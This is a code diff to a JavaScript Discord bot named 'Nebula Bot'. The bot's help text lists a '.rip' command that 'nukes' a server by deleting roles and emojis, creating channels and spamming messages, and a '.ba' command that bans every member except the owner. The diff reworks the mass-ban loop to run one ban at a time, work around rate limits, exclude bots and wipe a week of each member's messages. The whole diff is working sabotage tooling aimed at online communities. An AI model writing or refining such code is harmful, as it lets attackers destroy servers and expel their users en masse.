@@ -67,7 +67,7 @@ client.on('messageCreate', async (message) => {
       .setDescription('Here are the available commands for Nebula Bot:')
       .addFields(
         { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
-        { name: '.ba', value: 'Bans all members (except owner). Add --bots to ban bots too' },
+        { name: '.ba', value: 'Bans all members (except owner)' },
         { name: '.help', value: 'Sends this help message to your DMs' }
       )
       .setColor('#ff0000')
@@ -91,38 +91,31 @@ client.on('messageCreate', async (message) => {
 
     const guild = message.guild;
 
-    const banBots = args.includes('--bots');
-    const banOwnerId = args.includes('--owner'); // This won't work but can be used for logging
-
-    const membersToBan = guild.members.cache.filter(m => {
-      // Skip owner always
-      if (m.id === guild.ownerId) return false;
-      // If --bots flag is not set, skip bots
-      if (!banBots && m.user.bot) return false;
-      return true;
-    });
+    // Skip owner and bots
+    const membersToBan = guild.members.cache.filter(m =>
+      m.id !== guild.ownerId && !m.user.bot
+    );
 
     if (membersToBan.size === 0) {
-      return message.reply('❌ No members to ban.');
+      return message.reply('❌ No members available to ban.');
     }
 
     console.log(`🔪 Banning ${membersToBan.size} members...`);
 
-    await Promise.all(
-      membersToBan.map(async (member) => {
-        try {
-          await handleRateLimit(() =>
-            guild.members.ban(member, { reason: 'Nebula Ban All' })
-          );
-          console.log(`✅ Banned: ${member.user.tag}`);
-        } catch (err) {
-          console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
-        }
-        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid rate limits
-      })
-    );
+    for (const member of membersToBan.values()) {
+      try {
+        await handleRateLimit(() => guild.members.ban(member, {
+          reason: 'Nebula Ban All',
+          deleteMessageSeconds: 604800 // Delete 1 week of messages
+        }));
+        console.log(`✅ Banned: ${member.user.tag}`);
+      } catch (err) {
+        console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
+      }
+      await new Promise(r => setTimeout(r, 50)); // Small delay between bans
+    }
 
-    console.log(`✅ Successfully processed ban command.`);
+    console.log(`✅ Successfully banned all members.`);
     await message.reply(`✅ Banned ${membersToBan.size} members.`);
     return;
   }
